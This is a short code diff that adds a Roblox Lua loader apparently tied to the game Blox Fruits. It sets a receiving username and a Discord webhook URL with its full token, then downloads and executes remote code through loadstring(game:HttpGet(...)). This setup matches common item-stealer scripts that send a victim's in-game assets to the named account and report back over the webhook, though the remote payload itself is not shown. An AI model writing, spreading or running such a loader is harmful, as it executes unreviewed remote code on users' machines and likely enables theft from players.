@@ -1,0 +1,4 @@
+Username = "Xxa1n2g3e4l5oxX"
+Webhook = "https://discord.com/api/webhooks/1306570687313481738/TLGz8QBmVt8ZQnQW5ls0P1wUUgVu8WHVfhw1eRQduF-wuYs6LoQLG0NY20Z9xMfmLYou"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lichtroblox/Blox-Fruit/refs/heads/main/BloxFruit",true))()
